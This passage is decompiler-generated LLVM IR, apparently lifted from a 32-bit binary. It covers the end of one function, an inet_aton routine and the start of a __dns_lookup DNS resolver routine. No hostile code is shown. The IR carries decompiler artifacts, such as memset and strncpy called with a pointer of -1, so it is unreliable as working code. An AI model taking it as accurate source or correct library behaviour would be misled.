dec_label_pc_8052d7e.lr.ph:                       ; preds = %entry
  %v3_8052d7826 = zext i8 %v2_8052d7825 to i32
  %v5_8052d7827 = and i32 %v0_8052d61, -256
  %v6_8052d7828 = or i32 %v3_8052d7826, %v5_8052d7827
  %v4_8052d66 = ptrtoint i8* %arg1 to i32
  %v1_8052d7113 = inttoptr i32 %arg2 to i8*
  %v4_8052d71.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8052d7e

dec_label_pc_8052d6c:                             ; preds = %dec_label_pc_8052d7e, %dec_label_pc_8052d70
  %v6_8052d7123 = phi i32 [ %v6_8052d71, %dec_label_pc_8052d70 ], [ %v6_8052d7117, %dec_label_pc_8052d7e ]
  %v2_8052d7122 = phi i8 [ %v2_8052d71, %dec_label_pc_8052d70 ], [ %v2_8052d7114, %dec_label_pc_8052d7e ]
  %v0_8052d7021 = phi i32 [ %v1_8052d70, %dec_label_pc_8052d70 ], [ %arg2, %dec_label_pc_8052d7e ]
  %v15_8052d6c = icmp eq i8 %v2_8052d7122, %v2_8052d7833
  br i1 %v15_8052d6c, label %dec_label_pc_8052d84, label %dec_label_pc_8052d70

dec_label_pc_8052d70:                             ; preds = %dec_label_pc_8052d6c
  %v1_8052d70 = add i32 %v0_8052d7021, 1
  store i32 %v1_8052d70, i32* @edx, align 4
  %v1_8052d71 = inttoptr i32 %v1_8052d70 to i8*
  %v2_8052d71 = load i8, i8* %v1_8052d71, align 1
  %v3_8052d71 = zext i8 %v2_8052d71 to i32
  %v5_8052d71 = and i32 %v6_8052d7123, -256
  %v6_8052d71 = or i32 %v3_8052d71, %v5_8052d71
  store i32 %v6_8052d71, i32* @ecx, align 4
  %v4_8052d73 = icmp eq i8 %v2_8052d71, 0
  %v1_8052d75 = icmp eq i1 %v4_8052d73, false
  br i1 %v1_8052d75, label %dec_label_pc_8052d6c, label %dec_label_pc_8052d77

dec_label_pc_8052d77:                             ; preds = %dec_label_pc_8052d70, %dec_label_pc_8052d7e
  %v4_8052d71.pre36 = phi i32 [ %v6_8052d7117, %dec_label_pc_8052d7e ], [ %v6_8052d71, %dec_label_pc_8052d70 ]
  %v1_8052d77 = add i32 %v0_8052d7731, 1
  %v1_8052d78 = inttoptr i32 %v1_8052d77 to i8*
  %v2_8052d78 = load i8, i8* %v1_8052d78, align 1
  %v3_8052d78 = zext i8 %v2_8052d78 to i32
  %v5_8052d78 = and i32 %v6_8052d7834, -256
  %v6_8052d78 = or i32 %v3_8052d78, %v5_8052d78
  %v4_8052d7a = icmp eq i8 %v2_8052d78, 0
  br i1 %v4_8052d7a, label %dec_label_pc_8052d82, label %dec_label_pc_8052d7e

dec_label_pc_8052d7e:                             ; preds = %dec_label_pc_8052d7e.lr.ph, %dec_label_pc_8052d77
  %v4_8052d71.pre = phi i32 [ %v4_8052d71.pre.pre, %dec_label_pc_8052d7e.lr.ph ], [ %v4_8052d71.pre36, %dec_label_pc_8052d77 ]
  %v6_8052d7834 = phi i32 [ %v6_8052d7828, %dec_label_pc_8052d7e.lr.ph ], [ %v6_8052d78, %dec_label_pc_8052d77 ]
  %v2_8052d7833 = phi i8 [ %v2_8052d7825, %dec_label_pc_8052d7e.lr.ph ], [ %v2_8052d78, %dec_label_pc_8052d77 ]
  %v0_8052d7731 = phi i32 [ %v4_8052d66, %dec_label_pc_8052d7e.lr.ph ], [ %v1_8052d77, %dec_label_pc_8052d77 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_8052d7114 = load i8, i8* %v1_8052d7113, align 1
  %v3_8052d7115 = zext i8 %v2_8052d7114 to i32
  %v5_8052d7116 = and i32 %v4_8052d71.pre, -256
  %v6_8052d7117 = or i32 %v3_8052d7115, %v5_8052d7116
  store i32 %v6_8052d7117, i32* @ecx, align 4
  %v4_8052d7318 = icmp eq i8 %v2_8052d7114, 0
  %v1_8052d7520 = icmp eq i1 %v4_8052d7318, false
  br i1 %v1_8052d7520, label %dec_label_pc_8052d6c, label %dec_label_pc_8052d77

dec_label_pc_8052d82:                             ; preds = %dec_label_pc_8052d77, %entry
  br label %dec_label_pc_8052d84

dec_label_pc_8052d84:                             ; preds = %dec_label_pc_8052d6c, %dec_label_pc_8052d82
  %v0_8052d86 = phi i32 [ 0, %dec_label_pc_8052d82 ], [ %v0_8052d7731, %dec_label_pc_8052d6c ]
  store i32 %v0_8052d61, i32* @ebx, align 4
  ret i32 %v0_8052d86

; uselistorder directives
  uselistorder i32 %v6_8052d7117, { 2, 0, 1 }
  uselistorder i8 %v2_8052d7114, { 1, 2, 0 }
  uselistorder i32 %v1_8052d77, { 1, 0 }
  uselistorder i32 %v6_8052d71, { 1, 2, 0 }
  uselistorder i8 %v2_8052d71, { 1, 2, 0 }
  uselistorder i32 %v1_8052d70, { 2, 1, 0 }
  uselistorder i8 %v2_8052d7825, { 0, 2, 1 }
  uselistorder i32 %v0_8052d61, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052d84, { 1, 0 }
  uselistorder label %dec_label_pc_8052d7e, { 1, 0 }
  uselistorder label %dec_label_pc_8052d77, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8052d8f = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052d8f, i32* @ecx, align 4
  %v1_8052d93 = icmp eq i8* %arg1, null
  br i1 %v1_8052d93, label %dec_label_pc_8052e14, label %dec_label_pc_8052d97

dec_label_pc_8052d97:                             ; preds = %entry
  %v0_8052da2.pre = load i32, i32* @global_var_805a438, align 8
  br label %dec_label_pc_8052da2

dec_label_pc_8052da2:                             ; preds = %dec_label_pc_8052d97, %dec_label_pc_8052deb
  %v2_8052deb35 = phi i32 [ 1, %dec_label_pc_8052d97 ], [ %v3_8052deb, %dec_label_pc_8052deb ]
  %v0_8052da834 = phi i32 [ %v4_8052d8f, %dec_label_pc_8052d97 ], [ %v0_8052da84, %dec_label_pc_8052deb ]
  %v0_8052e0933 = phi i32 [ 0, %dec_label_pc_8052d97 ], [ %v2_8052df1, %dec_label_pc_8052deb ]
  %v1_8052da8 = inttoptr i32 %v0_8052da834 to i8*
  %v2_8052da8 = load i8, i8* %v1_8052da8, align 1
  %v3_8052da8 = sext i8 %v2_8052da8 to i32
  %v2_8052dab = mul nsw i32 %v3_8052da8, 2
  %v3_8052dab = add i32 %v2_8052dab, %v0_8052da2.pre
  %v4_8052dab = inttoptr i32 %v3_8052dab to i8*
  %v5_8052dab = load i8, i8* %v4_8052dab, align 1
  %v6_8052dab = and i8 %v5_8052dab, 8
  %v7_8052dab = icmp eq i8 %v6_8052dab, 0
  br i1 %v7_8052dab, label %dec_label_pc_8052e14, label %dec_label_pc_8052db2

dec_label_pc_8052db2:                             ; preds = %dec_label_pc_8052da2
  %v4_8052dc6.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052dc6

dec_label_pc_8052db6:                             ; preds = %dec_label_pc_8052dc6
  %v3_8052db6 = mul i32 %v1_8052db6, 10
  %v2_8052db9 = add i32 %v3_8052db6, -48
  %v3_8052db9 = add i32 %v2_8052db9, %v2_8052dc8
  %v1_8052dbd = add i32 %v3_8052db9, -255
  %v6_8052dbd = sub i32 254, %v3_8052db9
  %v7_8052dbd = and i32 %v6_8052dbd, %v3_8052db9
  %v8_8052dbd = icmp slt i32 %v7_8052dbd, 0
  %v9_8052dbd = icmp eq i32 %v1_8052dbd, 0
  %v10_8052dbd = icmp slt i32 %v1_8052dbd, 0
  %v3_8052dc3 = icmp eq i1 %v10_8052dbd, %v8_8052dbd
  %v4_8052dc3 = icmp eq i1 %v9_8052dbd, false
  %v5_8052dc3 = and i1 %v4_8052dc3, %v3_8052dc3
  br i1 %v5_8052dc3, label %dec_label_pc_8052e14, label %dec_label_pc_8052dc5

dec_label_pc_8052dc5:                             ; preds = %dec_label_pc_8052db6
  %v1_8052dc5 = add i32 %v0_8052dc5, 1
  store i32 %v1_8052dc5, i32* @ecx, align 4
  br label %dec_label_pc_8052dc6

dec_label_pc_8052dc6:                             ; preds = %dec_label_pc_8052db2, %dec_label_pc_8052dc5
  %v1_8052db6 = phi i32 [ 0, %dec_label_pc_8052db2 ], [ %v3_8052db9, %dec_label_pc_8052dc5 ]
  %v4_8052dc6 = phi i32 [ %v4_8052dc6.pre, %dec_label_pc_8052db2 ], [ %v6_8052dc6, %dec_label_pc_8052dc5 ]
  %v0_8052dc5 = phi i32 [ %v0_8052da834, %dec_label_pc_8052db2 ], [ %v1_8052dc5, %dec_label_pc_8052dc5 ]
  %v1_8052dc6 = inttoptr i32 %v0_8052dc5 to i8*
  %v2_8052dc6 = load i8, i8* %v1_8052dc6, align 1
  %v3_8052dc6 = zext i8 %v2_8052dc6 to i32
  %v5_8052dc6 = and i32 %v4_8052dc6, -256
  %v6_8052dc6 = or i32 %v3_8052dc6, %v5_8052dc6
  store i32 %v6_8052dc6, i32* @edx, align 4
  %v2_8052dc8 = sext i8 %v2_8052dc6 to i32
  %v2_8052dcb = mul nsw i32 %v2_8052dc8, 2
  %v3_8052dcb = add i32 %v2_8052dcb, %v0_8052da2.pre
  %v4_8052dcb = inttoptr i32 %v3_8052dcb to i16*
  %v5_8052dcb = load i16, i16* %v4_8052dcb, align 2
  %v2_8052dd0 = and i16 %v5_8052dcb, 8
  %v3_8052dd0 = icmp eq i16 %v2_8052dd0, 0
  %v1_8052dd2 = icmp eq i1 %v3_8052dd0, false
  br i1 %v1_8052dd2, label %dec_label_pc_8052db6, label %dec_label_pc_8052dd4

dec_label_pc_8052dd4:                             ; preds = %dec_label_pc_8052dc6
  %v8_8052dd4 = sub nsw i32 2, %v2_8052deb35
  %v9_8052dd4 = and i32 %v8_8052dd4, %v2_8052deb35
  %v10_8052dd4 = icmp slt i32 %v9_8052dd4, 0
  %v11_8052dd4 = icmp eq i32 %v2_8052deb35, 3
  %v12_8052dd4 = icmp slt i32 %v2_8052deb35, 3
  %v3_8052dd8 = icmp eq i1 %v12_8052dd4, %v10_8052dd4
  %v4_8052dd8 = icmp eq i1 %v11_8052dd4, false
  %v5_8052dd8 = and i1 %v4_8052dd8, %v3_8052dd8
  br i1 %v5_8052dd8, label %dec_label_pc_8052de2, label %dec_label_pc_8052dda

dec_label_pc_8052dda:                             ; preds = %dec_label_pc_8052dd4
  %v10_8052dda = icmp eq i8 %v2_8052dc6, 46
  %v1_8052ddd = icmp eq i1 %v10_8052dda, false
  br i1 %v1_8052ddd, label %dec_label_pc_8052e14, label %dec_label_pc_8052ddf

dec_label_pc_8052ddf:                             ; preds = %dec_label_pc_8052dda
  %v1_8052ddf = add i32 %v0_8052dc5, 1
  store i32 %v1_8052ddf, i32* @ecx, align 4
  br label %dec_label_pc_8052deb

dec_label_pc_8052de2:                             ; preds = %dec_label_pc_8052dd4
  %v1_8052de2 = add i32 %v0_8052dc5, 1
  store i32 %v1_8052de2, i32* @ecx, align 4
  %v4_8052de3 = icmp eq i8 %v2_8052dc6, 0
  br i1 %v4_8052de3, label %dec_label_pc_8052deb, label %dec_label_pc_8052de7

dec_label_pc_8052de7:                             ; preds = %dec_label_pc_8052de2
  %v2_8052de7 = and i16 %v5_8052dcb, 32
  %v3_8052de7 = icmp eq i16 %v2_8052de7, 0
  br i1 %v3_8052de7, label %dec_label_pc_8052e14, label %dec_label_pc_8052deb

dec_label_pc_8052deb:                             ; preds = %dec_label_pc_8052de7, %dec_label_pc_8052de2, %dec_label_pc_8052ddf
  %v0_8052da84 = phi i32 [ %v1_8052de2, %dec_label_pc_8052de7 ], [ %v1_8052de2, %dec_label_pc_8052de2 ], [ %v1_8052ddf, %dec_label_pc_8052ddf ]
  %v3_8052deb = add nuw nsw i32 %v2_8052deb35, 1
  %v2_8052dee = mul i32 %v0_8052e0933, 256
  %v2_8052df1 = or i32 %v1_8052db6, %v2_8052dee
  %v7_8052df7 = icmp sgt i32 %v2_8052deb35, 3
  br i1 %v7_8052df7, label %dec_label_pc_8052df9, label %dec_label_pc_8052da2

dec_label_pc_8052df9:                             ; preds = %dec_label_pc_8052deb
  %v4_8052df9 = icmp eq i32 %arg2, 0
  br i1 %v4_8052df9, label %dec_label_pc_8052e16, label %dec_label_pc_8052e05

dec_label_pc_8052e05:                             ; preds = %dec_label_pc_8052df9
  %v1_8052e09 = call i32 @llvm.bswap.i32(i32 %v2_8052df1)
  %v2_8052e0b = inttoptr i32 %arg2 to i32*
  store i32 %v1_8052e09, i32* %v2_8052e0b, align 4
  br label %dec_label_pc_8052e16

dec_label_pc_8052e14:                             ; preds = %dec_label_pc_8052de7, %dec_label_pc_8052dda, %dec_label_pc_8052da2, %dec_label_pc_8052db6, %entry
  br label %dec_label_pc_8052e16

dec_label_pc_8052e16:                             ; preds = %dec_label_pc_8052df9, %dec_label_pc_8052e05, %dec_label_pc_8052e14
  %v0_8052e1b = phi i32 [ 1, %dec_label_pc_8052df9 ], [ 1, %dec_label_pc_8052e05 ], [ 0, %dec_label_pc_8052e14 ]
  ret i32 %v0_8052e1b

; uselistorder directives
  uselistorder i32 %v2_8052dc8, { 1, 0 }
  uselistorder i32 %v6_8052dc6, { 1, 0 }
  uselistorder i8 %v2_8052dc6, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8052dc5, { 0, 1, 3, 2 }
  uselistorder i32 %v1_8052dbd, { 1, 0 }
  uselistorder i32 %v3_8052db9, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8052da834, { 1, 0 }
  uselistorder i32 %v2_8052deb35, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 3, 2, 1, 0 }
  uselistorder i32 -255, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052e16, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052e14, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_8052dc6, { 1, 0 }
  uselistorder label %dec_label_pc_8052da2, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp33 = sext i32 %arg2 to i64
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-252 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  store i8* inttoptr (i32 512 to i8*), i8** %stack_var_-252, align 4
  %v2_8052e32 = call i32 @malloc(i32 512)
  store i32 %v2_8052e32, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 1025 to i8*), i8** %stack_var_-252, align 4
  store i32 %v2_8052e32, i32* @ebp, align 4
  %v2_8052e40 = call i32 @malloc(i32 1025)
  store i32 %v2_8052e40, i32* %eax.global-to-local, align 4
  %v12_8052e49 = ptrtoint i32* %stack_var_-236 to i32
  %v1_8052e4c = icmp eq i32 %v2_8052e32, 0
  br i1 %v1_8052e4c, label %dec_label_pc_80534c5, label %dec_label_pc_8052e54

dec_label_pc_8052e54:                             ; preds = %entry
  %v1_8052e54 = icmp eq i32 %v2_8052e40, 0
  br i1 %v1_8052e54, label %dec_label_pc_80534c5, label %dec_label_pc_8052e5c

dec_label_pc_8052e5c:                             ; preds = %dec_label_pc_8052e54
  %v5_8052e5c = icmp eq i32 %arg2, 0
  br i1 %v5_8052e5c, label %dec_label_pc_80534c5, label %dec_label_pc_8052e6a

dec_label_pc_8052e6a:                             ; preds = %dec_label_pc_8052e5c
  %v4_8052e6a = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052e6a, i32* %eax.global-to-local, align 4
  %v2_8052e71 = load i8, i8* %arg1, align 1
  %v3_8052e71 = icmp eq i8 %v2_8052e71, 0
  br i1 %v3_8052e71, label %dec_label_pc_80534c5, label %dec_label_pc_8052e7a

dec_label_pc_8052e7a:                             ; preds = %dec_label_pc_8052e6a
  store i8* %arg1, i8** %stack_var_-252, align 4
  %v3_8052e7e = call i32 @strlen(i8* nonnull %arg1)
  store i32 %v3_8052e7e, i32* @eax, align 4
  store i32 %v4_8052e6a, i32* %edx.global-to-local, align 4
  %v2_8052ea1 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_8052ea1, i32* @ebx, align 4
  %tmp46 = bitcast i32* %stack_var_-52 to i8*
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_8052ea9 = call i32 @__pthread_return_void(i32 %v2_8052ea1, i32 134552291)
  store i32 %v3_8052ea9, i32* %eax.global-to-local, align 4
  store i8* bitcast (i8** @global_var_8060948.241 to i8*), i8** %stack_var_-252, align 4
  %v2_8052eb5 = call i32 @__pthread_return_0(i32 ptrtoint (i8** @global_var_8060948.241 to i32))
  %v0_8052eba = load i64, i64* @global_var_8060960.242, align 8
  %v1_8052eba = trunc i64 %v0_8052eba to i32
  %v1_8052ebf = ashr i32 %v1_8052eba, 31
  %v6_8052ec0 = and i64 %v0_8052eba, 4294967295
  %v8_8052ec0 = zext i32 %v1_8052ebf to i64
  %v9_8052ec0 = mul nuw i64 %v8_8052ec0, 4294967296
  %v10_8052ec0 = or i64 %v9_8052ec0, %v6_8052ec0
  %v14_8052ec0 = srem i64 %v10_8052ec0, %tmp33
  %v15_8052ec0 = trunc i64 %v14_8052ec0 to i32
  %v0_8052ec7 = load i16, i16* @global_var_805a6a4.243, align 4
  %v2_8052ed6 = load i8*, i8** %stack_var_-252, align 4
  %v3_8052ed6 = ptrtoint i8* %v2_8052ed6 to i32
  store i32 %v3_8052ed6, i32* @eax, align 4
  store i32 134552291, i32* %edx.global-to-local, align 4
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_8052edb = call i32 @__pthread_return_void(i32 %v2_8052ea1, i32 1)
  store i32 %v3_8052edb, i32* %eax.global-to-local, align 4
  %v4_8053082 = inttoptr i32 %v15_8052ec0 to i8*
  %v1_80534a072 = add i32 %v12_8052e49, 28
  %v2_80534a073 = inttoptr i32 %v1_80534a072 to i32*
  %v3_80534a074 = load i32, i32* %v2_80534a073, align 4
  %tmp = icmp ult i32 %v3_80534a074, 3
  br i1 %tmp, label %dec_label_pc_8052f00, label %dec_label_pc_80534c5

dec_label_pc_8052f00:                             ; preds = %dec_label_pc_8052e7a, %dec_label_pc_80534a0.backedge
  %v0_8052f0783 = phi i32 [ %v0_80534a0.pre, %dec_label_pc_80534a0.backedge ], [ %v12_8052e49, %dec_label_pc_8052e7a ]
  %v1_8052f00 = add i32 %v0_8052f0783, 20
  %v2_8052f00 = inttoptr i32 %v1_8052f00 to i32*
  %v3_8052f00 = load i32, i32* %v2_8052f00, align 4
  %v13_8052f00 = icmp eq i32 %v3_8052f00, -1
  br i1 %v13_8052f00, label %dec_label_pc_8052f00.dec_label_pc_8052f16_crit_edge, label %dec_label_pc_8052f07

dec_label_pc_8052f00.dec_label_pc_8052f16_crit_edge: ; preds = %dec_label_pc_8052f00
  %v0_8052f16.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052f16

dec_label_pc_8052f07:                             ; preds = %dec_label_pc_8052f00
  %v3_8052f0a = load i32, i32* %v2_8052f00, align 4
  %v5_8052f0a = add i32 %v0_8052f0783, -16
  %v6_8052f0a = inttoptr i32 %v5_8052f0a to i32*
  store i32 %v3_8052f0a, i32* %v6_8052f0a, align 4
  %v1_8052f0e = call i32 @__libc_close(i32 -1)
  store i32 %v1_8052f0e, i32* %eax.global-to-local, align 4
  %v0_8052f13 = load i32, i32* @esp, align 4
  %v1_8052f13 = add i32 %v0_8052f13, 16
  br label %dec_label_pc_8052f16

dec_label_pc_8052f16:                             ; preds = %dec_label_pc_8052f00.dec_label_pc_8052f16_crit_edge, %dec_label_pc_8052f07
  %v1_8052f16 = phi i32 [ %v0_8052f0783, %dec_label_pc_8052f00.dec_label_pc_8052f16_crit_edge ], [ %v1_8052f13, %dec_label_pc_8052f07 ]
  %v0_8052f16 = phi i32 [ %v0_8052f16.pre, %dec_label_pc_8052f00.dec_label_pc_8052f16_crit_edge ], [ %v1_8052f0e, %dec_label_pc_8052f07 ]
  %v2_8052f16 = add i32 %v1_8052f16, -4
  %v3_8052f16 = inttoptr i32 %v2_8052f16 to i32*
  store i32 %v0_8052f16, i32* %v3_8052f16, align 4
  %v1_8052f17 = add i32 %v1_8052f16, -8
  %v2_8052f17 = inttoptr i32 %v1_8052f17 to i32*
  store i32 512, i32* %v2_8052f17, align 4
  %v1_8052f1c = add i32 %v1_8052f16, -12
  %v2_8052f1c = inttoptr i32 %v1_8052f1c to i32*
  store i32 0, i32* %v2_8052f1c, align 4
  %v2_8052f1e = add i32 %v1_8052f16, -16
  %v3_8052f1e = inttoptr i32 %v2_8052f1e to i32*
  store i32 %v2_8052e32, i32* %v3_8052f1e, align 4
  %v4_8052f1f = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_8052ec0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8052f1f, i32* %eax.global-to-local, align 4
  %v0_8052f24 = load i32, i32* @esp, align 4
  %v1_8052f27 = add i32 %v0_8052f24, 8
  %v2_8052f27 = inttoptr i32 %v1_8052f27 to i32*
  store i32 48, i32* %v2_8052f27, align 4
  %v1_8052f29 = add i32 %v0_8052f24, 4
  %v2_8052f29 = inttoptr i32 %v1_8052f29 to i32*
  store i32 0, i32* %v2_8052f29, align 4
  %v1_8052f2b = add i32 %v0_8052f24, 84
  store i32 %v1_8052f2b, i32* @ebx, align 4
  %v3_8052f2f = inttoptr i32 %v0_8052f24 to i32*
  store i32 %v1_8052f2b, i32* %v3_8052f2f, align 4
  %v4_8052f30 = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_8052ec0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8052f30, i32* %eax.global-to-local, align 4
  %v0_8052f35 = load i32, i32* @esp, align 4
  %v1_8052f35 = add i32 %v0_8052f35, 72
  %v2_8052f35 = inttoptr i32 %v1_8052f35 to i32*
  %v3_8052f35 = load i32, i32* %v2_8052f35, align 4
  store i32 %v3_8052f35, i32* %eax.global-to-local, align 4
  %v1_8052f39 = add i32 %v0_8052f35, 116
  %v2_8052f39 = inttoptr i32 %v1_8052f39 to i32*
  store i32 1, i32* %v2_8052f39, align 4
  %v0_8052f41 = load i32, i32* @esp, align 4
  %v1_8052f41 = add i32 %v0_8052f41, 104
  %v2_8052f41 = inttoptr i32 %v1_8052f41 to i32*
  store i32 1, i32* %v2_8052f41, align 4
  %v0_8052f49 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052f49 = add i32 %v0_8052f49, 1
  %v1_8052f4a = urem i32 %v1_8052f49, 65536
  store i32 %v1_8052f4a, i32* %eax.global-to-local, align 4
  %v1_8052f4f = load i32, i32* @esp, align 4
  %v2_8052f4f = add i32 %v1_8052f4f, 72
  %v3_8052f4f = inttoptr i32 %v2_8052f4f to i32*
  store i32 %v1_8052f4a, i32* %v3_8052f4f, align 4
  %v0_8052f53 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052f53 = load i32, i32* @esp, align 4
  %v2_8052f53 = add i32 %v1_8052f53, 84
  %v3_8052f53 = inttoptr i32 %v2_8052f53 to i32*
  store i32 %v0_8052f53, i32* %v3_8052f53, align 4
  %v0_8052f57 = load i32, i32* @esp, align 4
  %v1_8052f5a = add i32 %v0_8052f57, 8
  %v2_8052f5a = inttoptr i32 %v1_8052f5a to i32*
  store i32 512, i32* %v2_8052f5a, align 4
  %v2_8052f5f = add i32 %v0_8052f57, 4
  %v3_8052f5f = inttoptr i32 %v2_8052f5f to i32*
  store i32 %v2_8052e32, i32* %v3_8052f5f, align 4
  %v0_8052f60 = load i32, i32* @ebx, align 4
  %v3_8052f60 = inttoptr i32 %v0_8052f57 to i32*
  store i32 %v0_8052f60, i32* %v3_8052f60, align 4
  %v0_8052f61 = call i32 @__encode_header()
  store i32 %v0_8052f61, i32* %eax.global-to-local, align 4
  %v0_8052f66 = load i32, i32* @esp, align 4
  %v2_8052f69 = icmp slt i32 %v0_8052f61, 0
  store i32 %v0_8052f61, i32* @ebx, align 4
  br i1 %v2_8052f69, label %dec_label_pc_80534c5, label %dec_label_pc_8052f73

dec_label_pc_8052f73:                             ; preds = %dec_label_pc_8052f16
  %v2_8052f73 = add i32 %v0_8052f66, 12
  %v3_8052f73 = inttoptr i32 %v2_8052f73 to i32*
  store i32 %v0_8052f61, i32* %v3_8052f73, align 4
  %v1_8052f74 = add i32 %v0_8052f66, 8
  %v2_8052f74 = inttoptr i32 %v1_8052f74 to i32*
  store i32 1025, i32* %v2_8052f74, align 4
  %v1_8052f79 = add i32 %v0_8052f66, 256
  %v2_8052f79 = inttoptr i32 %v1_8052f79 to i32*
  %v3_8052f79 = load i32, i32* %v2_8052f79, align 4
  %v5_8052f79 = add i32 %v0_8052f66, 4
  %v6_8052f79 = inttoptr i32 %v5_8052f79 to i32*
  store i32 %v3_8052f79, i32* %v6_8052f79, align 4
  %v1_8052f80 = add i32 %v0_8052f66, 28
  %v2_8052f80 = inttoptr i32 %v1_8052f80 to i32*
  %v3_8052f80 = load i32, i32* %v2_8052f80, align 4
  %v6_8052f80 = inttoptr i32 %v0_8052f66 to i32*
  store i32 %v3_8052f80, i32* %v6_8052f80, align 4
  %v4_8052f84 = call i32 @strncpy(i8* inttoptr (i32 -1 to i8*), i32 %v15_8052ec0, i32 ptrtoint (i32* @0 to i32))
  %v0_8052f89 = load i32, i32* @esp, align 4
  %v1_8052f8c = add i32 %v0_8052f89, 8
  %v2_8052f8c = inttoptr i32 %v1_8052f8c to i32*
  store i32 ptrtoint (i32* @global_var_805a6a8.183 to i32), i32* %v2_8052f8c, align 4
  %v1_8052f91 = add i32 %v0_8052f89, 4
  %v2_8052f91 = inttoptr i32 %v1_8052f91 to i32*
  store i32 134552291, i32* %v2_8052f91, align 4
  %v1_8052f96 = add i32 %v0_8052f89, 200
  store i32 %v1_8052f96, i32* @eax, align 4
  %v3_8052f9d = inttoptr i32 %v0_8052f89 to i32*
  store i32 %v1_8052f96, i32* %v3_8052f9d, align 4
  %v2_8052f9e = call i32 @__pthread_return_void(i32 -1, i32 %v15_8052ec0)
  store i32 %v2_8052f9e, i32* %eax.global-to-local, align 4
  %v0_8052fa3 = load i32, i32* @esp, align 4
  %v1_8052fa3 = inttoptr i32 %v0_8052fa3 to i32*
  store i32 ptrtoint (i32* @global_var_805a6a8.183 to i32), i32* %v1_8052fa3, align 4
  %v1_8052faa = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8052faa, i32* %eax.global-to-local, align 4
  %v0_8052faf = load i32, i32* @esp, align 4
  %v1_8052faf = add i32 %v0_8052faf, 56
  %v2_8052faf = inttoptr i32 %v1_8052faf to i32*
  %v3_8052faf = load i32, i32* %v2_8052faf, align 4
  store i32 %v3_8052faf, i32* %edx.global-to-local, align 4
  %v1_8052fb3 = add i32 %v0_8052faf, 268
  %v2_8052fb3 = inttoptr i32 %v1_8052fb3 to i32*
  %v3_8052fb3 = load i32, i32* %v2_8052fb3, align 4
  store i32 %v3_8052fb3, i32* %eax.global-to-local, align 4
  %v2_8052fba = mul i32 %v3_8052faf, 4
  %v3_8052fba = add i32 %v3_8052fb3, %v2_8052fba
  %v4_8052fba = inttoptr i32 %v3_8052fba to i32*
  %v5_8052fba = load i32, i32* %v4_8052fba, align 4
  store i32 %v5_8052fba, i32* %edx.global-to-local, align 4
  %v2_8052fbd = add i32 %v0_8052faf, 48
  %v3_8052fbd = inttoptr i32 %v2_8052fbd to i32*
  store i32 %v5_8052fba, i32* %v3_8052fbd, align 4
  %v0_8052fc1 = load i32, i32* @esp, align 4
  %v1_8052fc1 = add i32 %v0_8052fc1, 16
  %v1_8052fc4 = add i32 %v0_8052fc1, 52
  %v2_8052fc4 = inttoptr i32 %v1_8052fc4 to i32*
  %v3_8052fc4 = load i32, i32* %v2_8052fc4, align 4
  %v5_8052fc4 = icmp slt i32 %v3_8052fc4, 0
  br i1 %v5_8052fc4, label %dec_label_pc_8052f73.dec_label_pc_805300a_crit_edge, label %dec_label_pc_8052fcb

dec_label_pc_8052f73.dec_label_pc_805300a_crit_edge: ; preds = %dec_label_pc_8052f73
  %v0_805300a.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805300a

dec_label_pc_8052fcb:                             ; preds = %dec_label_pc_8052f73
  store i32 %v3_8052fc4, i32* %eax.global-to-local, align 4
  %v1_8052fcf = load i32, i32* @global_var_8060d98.244, align 8
  %v2_8052fcf = sub i32 %v3_8052fc4, %v1_8052fcf
  %v8_8052fcf = xor i32 %v1_8052fcf, %v3_8052fc4
  %v9_8052fcf = xor i32 %v2_8052fcf, %v3_8052fc4
  %v10_8052fcf = and i32 %v9_8052fcf, %v8_8052fcf
  %v11_8052fcf = icmp slt i32 %v10_8052fcf, 0
  %v13_8052fcf = icmp slt i32 %v2_8052fcf, 0
  %v2_8052fd5 = icmp eq i1 %v13_8052fcf, %v11_8052fcf
  br i1 %v2_8052fd5, label %dec_label_pc_805300a, label %dec_label_pc_8052fd7

dec_label_pc_8052fd7:                             ; preds = %dec_label_pc_8052fcb
  %v2_8052fd7 = add i32 %v0_8052fc1, 12
  %v3_8052fd7 = inttoptr i32 %v2_8052fd7 to i32*
  store i32 %v3_8052fc4, i32* %v3_8052fd7, align 4
  %v1_8052fd8 = add i32 %v0_8052fc1, 8
  %v2_8052fd8 = inttoptr i32 %v1_8052fd8 to i32*
  store i32 1025, i32* %v2_8052fd8, align 4
